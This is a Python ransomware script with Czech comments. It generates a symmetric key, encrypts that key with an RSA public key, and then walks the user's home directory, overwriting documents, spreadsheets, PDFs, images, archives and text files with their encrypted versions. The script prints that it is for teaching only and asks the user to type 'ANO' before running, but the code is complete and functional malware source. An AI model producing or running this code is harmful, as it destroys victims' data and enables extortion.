import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives import serialization

class Encrypt:
    def __init__(self, extensions):
        self.extensions = extensions
        self.symmetric_key = None
        self.fernet = None

    def load_public_key(self):
        # Načte veřejný klíč z environmentální proměnné
        public_key_path = os.getenv("PUBLIC_KEY_PATH")
        if not public_key_path:
            raise ValueError("PUBLIC_KEY_PATH není nastavena jako environmentální proměnná.")

        with open(public_key_path, "rb") as key_file:
            public_key = serialization.load_pem_public_key(key_file.read())
        return public_key

    def generate_symmetric_key(self):
        # Generuje symetrický klíč a inicializuje Fernet
        self.symmetric_key = Fernet.generate_key()
        self.fernet = Fernet(self.symmetric_key)

    def encrypt_symmetric_key(self):
        # Šifruje symetrický klíč veřejným klíčem
        public_key = self.load_public_key()
        encrypted_key = public_key.encrypt(
            self.symmetric_key,
            OAEP(mgf=MGF1(algorithm=SHA256()), algorithm=SHA256(), label=None)
        )
        with open("encrypted_sym_key.bin", "wb") as key_file:
            key_file.write(encrypted_key)
        print("Symetrický klíč zašifrován a uložen.")

    def encrypt_files(self, directory):
        # Prohledá adresář a zašifruje soubory
        for root, dirs, files in os.walk(directory):
            for file in files:
                if any(file.endswith(ext) for ext in self.extensions):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "rb") as f:
                            data = f.read()
                        encrypted_data = self.fernet.encrypt(data)
                        with open(file_path, "wb") as f:
                            f.write(encrypted_data)
                        print(f"Zašifrován soubor: {file_path}")
                    except Exception as e:
                        print(f"Chyba při šifrování {file_path}: {e}")

if __name__ == "__main__":
    print("Tento skript je pouze pro výuku!")
    confirm = input("Opravdu chcete pokračovat? Napište 'ANO': ")
    if confirm == "ANO":
        ransomware = Encrypt(extensions=[
            ".doc", ".docx", ".xls", ".xlsx", ".pdf",
            ".jpg", ".jpeg", ".png", ".zip", ".rar", ".txt"
        ])
        ransomware.generate_symmetric_key()
        ransomware.encrypt_symmetric_key()
        ransomware.encrypt_files(os.path.expanduser("~"))
    else:
        print("Operace byla zrušena.")